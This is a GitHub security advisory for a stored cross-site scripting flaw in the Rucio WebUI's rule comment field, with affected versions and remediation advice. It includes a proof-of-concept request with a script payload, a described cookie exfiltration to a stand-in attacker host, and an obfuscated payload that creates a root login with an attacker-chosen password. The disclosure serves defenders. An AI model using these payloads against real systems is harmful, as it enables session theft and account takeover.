# [H] Rucio WebUI Vulnerable to Stored Cross-site Scripting (XSS) through Custom Rule Function

## Summary
Severity: High
Advisory: GHSA-rwj9-7j48-9f7q
CVE: CVE-2026-25733
CWE: CWE-1004, CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-rwj9-7j48-9f7q
Type: github-advisory

## Affected
- PyPI: `rucio-webui` — affected >=0 <35.8.3
- PyPI: `rucio-webui` — affected >=36.0.0rc1 <38.5.4
- PyPI: `rucio-webui` — affected >=39.0.0rc1 <39.3.1

## Details
### Summary
A stored Cross-site Scripting (XSS) vulnerability was identified in the Custom Rules function of the WebUI where attacker-controlled input is persisted by the backend and later rendered in the WebUI without proper output encoding. This allows arbitrary JavaScript execution in the context of the WebUI for users who view affected pages, potentially enabling session token theft or unauthorized actions.

---
### Details
A malicious payload supplied in the `comment` field is stored by the backend. When the rule is later viewed or approved, the stored script executes in the WebUI origin.

**Create Path**:  
Monitoring > Subscriptions and Rules > Request New Rule > Options > Add Comment

**Trigger Paths**:  
- **User Trigger**: Monitoring > Subscriptions and Rules > Show My Rules > *RULE NAME*  
  (`https://localhost:8443/ui/rule?rule_id=<RULE_ID>`)
- **Admin Trigger**: Data Transfer (R2D2) > Approve Rules > *RULE NAME*

**Create Request**
```http
POST /proxy/rules/ HTTP/1.1
...
{"dids":[{"scope":"test","name":"dataset1"}],"account":"pentest","ask_approval":true,"activity":"User Subscriptions","rse_expression":"WEB1","copies":1,"grouping":"DATASET","lifetime":15552000,"comment":"<script>alert(document.cookie)</script>","asynchronous":false,"notify":"N"}
```

**Response**
```http
HTTP/1.1 201 CREATED
...
["c2d675c1979d4549b26eede3531a7e6a"]
```

**Creating RSE with XSS payload in comment**
<img width="1032" height="667" alt="Creating RSE with XSS payload in comment" src="https://github.com/user-attachments/assets/00258839-5288-48ed-856c-30cfee19d3c4" />

**Reviewing rule creation requests**
<img width="1201" height="625" alt="Reviewing rule creation requests" src="https://github.com/user-attachments/assets/1b5fc7af-a664-42dc-a3d4-b00755fe2bd7" />

**XSS Payload triggering on rule review**
<img width="1197" height="417" alt="XXS Payload triggering on rule review" src="https://github.com/user-attachments/assets/463e843a-1e9e-492e-960f-7d3edac2fd1e" />

---
### Impact
Any authenticated user who views affected resources may execute attacker-controlled JavaScript in the WebUI origin. Depending on the affected feature, this may impact all users or administrative users only.

The impact is amplified by:
- Session cookies that are accessible to JavaScript (missing HttpOnly flag).
- API tokens exposed to the WebUI via JavaScript variables.

An attacker would likely attempt to exfiltrate the session token to an external site by setting an encoded version of the cookie as the path of a GET request to an attacker controlled site (i.e `GET https://attacker.example.com/rucio/{BASE64_COOKIE}`).

Attackers can also perform actions as the victim like creating a new UserPass identity with an attacker known password, creating/deleting an RSE, or exfiltrating data.

**XSS Payload to Create Root UserPass**
```html
<img src=x onerror=(function(){o={};o.method='PUT';o.credentials='include';o.headers={'X-Rucio-Username':'attackeruser','X-Rucio-Password':'AttackerPassword123','X-Rucio-Email':'demo@example.org','X-Rucio-Auth-Token':token};fetch(String.fromCharCode(47)+'identities'+String.fromCharCode(47)+'root'+String.fromCharCode(47)+'userpass',o)})()>
```

---
### Remediation / Mitigation
All client-side renderings of server-provided or user-controlled data must ensure proper HTML escaping before insertion into the DOM. Unsafe methods such as `.html()` should be avoided unless the content is explicitly sanitized. Safer alternatives include `.text()`, creating text nodes, or using a templating system that enforces automatic escaping.

Additional defense-in-depth measures include:
- Enforcing a strict Content Security Policy (CSP).
- Setting the HttpOnly flag on session cookies.
- Avoiding exposure of API tokens in JavaScript-accessible variables.

> Note that many pages were found setting the API token as `token` in an authenticated response like `var token = "root-root-webui-...:"` (See `/ui/list_accounts` for example)

---
### Resources
- OWASP XSS Prevention Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

## References
- https://github.com/rucio/rucio/security/advisories/GHSA-rwj9-7j48-9f7q
- https://nvd.nist.gov/vuln/detail/CVE-2026-25733
- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://github.com/rucio/rucio
- https://github.com/rucio/rucio/releases/tag/35.8.3
- https://github.com/rucio/rucio/releases/tag/38.5.4
- https://github.com/rucio/rucio/releases/tag/39.3.1
